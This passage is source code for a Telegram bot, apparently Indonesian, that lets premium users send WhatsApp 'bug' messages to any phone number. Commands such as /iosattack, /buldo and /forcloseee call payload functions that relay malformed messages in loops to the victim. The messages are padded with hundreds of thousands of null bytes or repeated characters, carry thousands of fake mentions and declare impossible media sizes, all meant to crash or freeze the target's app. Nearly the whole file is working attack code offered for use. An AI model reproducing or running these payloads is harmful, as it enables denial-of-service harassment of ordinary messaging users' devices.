  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /iosattack 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      await IPhoneDelay(target, ptcp = true);
      await sleep(8000);
    }
  })();
});
bot.command("blankandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankandro 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankandro 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      await blankuiiiiii(sock, target);
      await sleep(1000);
    }
  })();
});

bot.command("blankvideo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankandro 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankvideo 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      await videoblankui(sock, target);
      await sleep(1000);
    }
  })();
});

bot.command("buldo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /crashui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /buldo
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await BuldozerNoDelay(sock, target);
      await sleep(3000);
    }
  })();
});
bot.command("forseclikk", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /forseclikk 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /forseclikk 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      await fcclick(sock, target);
      await sleep(1000);
    }
  })();
});
bot.command("forcloseee", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /forcloseee 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /forcloseee
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      await sendAlbumMessage(sock, target);
      await sleep(5000);
    }
  })();
});
bot.command("delayspmm", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayspmm 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayspmm
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      await delaysspam(sock, target);
      await sleep(1000);
    }
  })();
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

bot.command("addsender", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah! Example: /addsender 628123456789");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  // Validasi nomor
  if (phoneNumber.length < 10) {
    return await ctx.reply("❌ Nomor tidak valid! Minimal 10 digit.\nContoh: 628123456789");
  }

  // Cek apakah sudah terhubung
  if (sock && sock.user) {
    return await ctx.reply("✅ WhatsApp sudah terhubung!");
  }

  // Kirim pesan "sedang memproses"
  const processingMsg = await ctx.reply("🔄 *Sedang memproses pairing...*\n\nMohon tunggu 10-30 detik.", {
    parse_mode: "Markdown"
  });

  try {
    // Request pairing code
    const code = await sock.requestPairingCode(phoneNumber, "DILZOFFC");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    // Hapus pesan processing
    await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id).catch(() => {});

    // Simpan ke waiting list
    pairingWaiting[ctx.chat.id] = { phoneNumber, startTime: Date.now() };

    // Kirim kode pairing
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
✅ *KODE PAIRING BERHASIL DIBUAT!*

┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━

⚠️ *Cara menggunakan:*
1. Buka WhatsApp
2. Klik 3 titik → Perangkat Tertaut
3. Klik Tautkan Perangkat
4. Masukkan kode: <code>${formattedCode}</code>

`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "👨‍💻 Developers", url: "https://t.me/dickxmod" }]],
      },
    });

    // SET TIMEOUT 2 MENIT (fallback)
    setTimeout(async () => {
      if (pairingWaiting[ctx.chat.id]) {
        await bot.sendMessage(ctx.chat.id,
          `❌ *PAIRING GAGAL!*\n\n` +
          `📱 Nomor: ${phoneNumber}\n` +
          `⚠️ Alasan: Timeout (tidak ada koneksi dalam 2 menit)\n\n` +
          `Coba lagi dengan /addsender ${phoneNumber}`,
          { parse_mode: "Markdown" }
        );
        delete pairingWaiting[ctx.chat.id];
      }
    }, 120000); // 2 menit

  } catch (error) {
    console.error("Pairing error:", error);
    
    // Hapus pesan processing
    await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id).catch(() => {});
    
    // Kirim pesan error
    let errorMsg = "❌ *GAGAL MEMBUAT KODE PAIRING!*\n\n";
    
    if (error.message?.includes("timeout")) {
      errorMsg += "⏱️ *Timeout!*\nServer WhatsApp tidak merespon. Coba lagi nanti.";
    }
    else if (error.message?.includes("not registered")) {
      errorMsg += "📵 *Nomor tidak terdaftar!*\nPastikan nomor WhatsApp aktif.";
    }
    else {
      errorMsg += `⚠️ *Error:* ${error.message || "Terjadi kesalahan"}\n\nCoba lagi nanti.`;
    }
    
    await ctx.reply(errorMsg, { parse_mode: "Markdown" });
  }
});

///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////START FUNC/////////////////////////
async function fcclick(sock, target) {
    const Msg = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'IDR',
                amount1000: 1000000,
                requestFrom: target,
                noteMessage: {
                    extendedTextMessage: {
                        text: 'Pembayaran Layanan'
                    }
                },
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400,
                amount: {
                    value: 1000,
                    offset: 1000,
                    currencyCode: 'IDR'
                },
                background: {
                    id: '1' 
                }
            }
    }

    try {
    await sock.relayMessage(target, Msg, 
    {
      participant: { jid: target }
    });
    console.log(`Sucses Sending Bug To ${target}`);
  } catch (e) {
    console.log(e);
  }
}

async function videoblankui(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/dl9zmo.jpg",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦾ".repeat(4500)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Team Viper Invictus" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ꦾ".repeat(1000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/dl9zmo.jpg",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/sennsofhopee",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function BuldozerNoDelay(sock, target) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "\u0000",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, () => ({
                  type: 1
                }))
              }
            },
            body: {
              text: "VISI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "{ X: { status:true } }",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 9000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Msg, {
      participant: { jid: target }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function blankuiiiiii(sock, target) {

  const uni = "ꦾ".repeat(30000)  
  
  const NeoGrup = await Promise.all(
    Array.from({ length: 3 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          groupInviteMessage: {
            groupJid: `1234567890-12345${i}@g.us`,
            inviteCode: "NeO" + i,
            inviteExpiration: null,
            groupName: "Maklu Busuk" + (i + 1) + " " + uni,
            caption: "YUK-O ARE HERE" + (i + 1) + " " + uni,
            jpegThumbnail: null
          }
        },
        {}
      )
    )
  )

  const NeoCh = await Promise.all(
    Array.from({ length: 2 }, (_, i) =>
      generateWAMessageFromContent(
        target,
        {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363424081787233@newsletter",
            newsletterName: "𝘠𝘶𝘬𝘰 - 𝘈𝘱𝘱𝘉𝘶𝘨" + (i + 1) + " " + uni,
            caption: "𝘠𝘶𝘬𝘰" + (i + 1) + " " + uni,
            inviteExpiration: null
          }
        },
        {}
      )
    )
  )

  for (const m of [...NeoGrup, ...NeoCh]) {
    await sock.relayMessage(
      target,
      m.message,
      { messageId: m.key.id }
    )
  }
}

async function sendAlbumMessage(sock, target) {
  try {
    const album = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
    }

    const message = {
      groupStatusMessageV2: {
        message: {
          albumMessage: {
            stickerMessage: album,
            contextInfo: {
              quotedMessage: {
                stickerMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                  mimetype: "image/webp",
                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                  fileLength: "10610",
                  mediaKeyTimestamp: "1775044724",
                  stickerSentTs: "1775044724091"
                }
              }
            }
          }
        }
      }
    }

    await sock.relayMessage(target, message, {
      messageId: sock.generateMessageTag()
    })

  } catch (err) {
    console.error("❌ Error:", err)
  }
}

async function comboVnxz(sock, target, ptcp = false) {
    console.log("Starting Combo VnxZ Attack...");
    
    console.log("VnxS");
    const msg = {
        eventMessage: {
            name: "VinxzOffc" + "\u0000".repeat(150000),
            description: "\u0000".repeat(150000),
            startTime: -1,
            endTime: -0,
            location: {
                name: "\u0000".repeat(250000),
                address: "\u0000".repeat(150000)
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`),
                quotedMessage: {
                    stickerMessage: {}
                }
            }
        }
    };
    
    try {
        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
        console.log(`Combo Send To ${target}`);
    } catch (e) {
        console.log("❌ Error sending xlay eventMessage:", e.message || e);
    }
  
    await new Promise(r => setTimeout(r, 200));
    
    const interactiveMsg = {
        interactiveResponseMessage: {
            body: {
                text: "VnxZ",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
            },
            entryPointConversionSource: "call_permission_request",
        }
    };
    
    try {
        await sock.relayMessage(target, interactiveMsg, { participant: { jid: target } });
        console.log(`✅ InteractiveResponseMessage sent successfully to ${target}`);
    } catch (e) {
        console.log("❌ Error sending interactiveResponseMessage:", e.message || e);
    }
    
    console.log("Combo VnxZ Attack Finished!");
}

async function LocationUi(sock, target) {
const object1 = "ꦽ".repeat(90000);
const object2 = "ꦾ".repeat(1000);
  const object = {
    locationMessage: {
      degreesLatitude: -1e15,
      degreesLongtitude: -999,
      name: "NiccawMD -" + object1,
      address: object2 + object1,
      url: `https://${object2}.com`,
      jpegThumbnail: Buffer.alloc(0),
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        bussinesForwardingInfo: {
          bussinesOwnerJid: target
        },
        mentionedJid: [target, "13135550002@s.whatsapp.net"],
      }
    }
  }
  await sock.relayMessage(target, object, {
    messageId: sock.generateMessageTag()
  });
}

async function delaysspam(sock, target) {
  try {
    const pler = {
    groupStatusMessageV2: {
      message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            nativeFlowResponseMessage: {
             name: "cta_url",
             paramsJson: JSON.stringify({
             flow_cta: "\u0000".repeat(90000)
            })
          },
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, pler, {
      messageId: null
    });
    
    console.log("Success But");
  } catch (err) {
    console.error("Error:", err);
  }
}

async function VnxzImups(target, ptcp = false) {
    const interactiveMsg = {
        interactiveResponseMessage: {
            body: {
                text: "VnxZ",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
            },
            entryPointConversionSource: "call_permission_request",
        }
    };

    try {
        await sock.relayMessage(target, interactiveMsg, { participant: { jid: target } });
        console.log(`InteractiveResponseMessage sent successfully to ${target}`);
    } catch (e) {
        console.log("❌ Error sending interactiveResponseMessage:", e.message || e);
    }
}

///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();